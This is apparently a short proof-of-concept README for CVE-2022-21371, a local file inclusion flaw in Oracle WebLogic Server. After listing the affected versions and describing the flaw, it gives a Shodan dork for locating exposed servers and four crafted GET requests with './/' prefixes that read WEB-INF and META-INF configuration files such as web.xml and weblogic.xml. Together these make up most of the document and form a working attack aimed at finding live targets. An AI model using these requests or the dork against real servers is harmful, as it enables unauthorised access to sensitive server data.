# Oracle-WebLogic-CVE-2022-21371

Oracle WebLogic Server Local File Inclusion : CVE-2022-21371

Affected Version: Version: 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0

Description: The Oracle Fusion Middleware's Oracle WebLogic Server product (Web Container component) is vulnerable to local file inclusion. An easily exploited vulnerability could allow an unauthenticated attacker with HTTP network access to compromise Oracle WebLogic Server.
A successful attack on this vulnerability, provide hackers complete access to Oracle WebLogic Server's whole data store or unrestricted access to sensitive data.

##### Dork:
Shodan: product:"Oracle WebLogic"

##### Proof of Concept

``` GET .//META-INF/MANIFEST.MF
GET .//WEB-INF/web.xml
GET .//WEB-INF/portlet.xml
GET .//WEB-INF/weblogic.xml 
```


#### Follow us 
#### [Vulnmachines Platform](https://www.vulnmachines.com)
#### [YouTube](https://www.youtube.com/c/vulnmachines)
#### [Twitter](https://www.twitter.com/vulnmachines)
#### [Facebook](https://www.facebook.com/vulnmachines)
#### [LinkedIn](https://www.linkedin.com/company/vulnmachines)
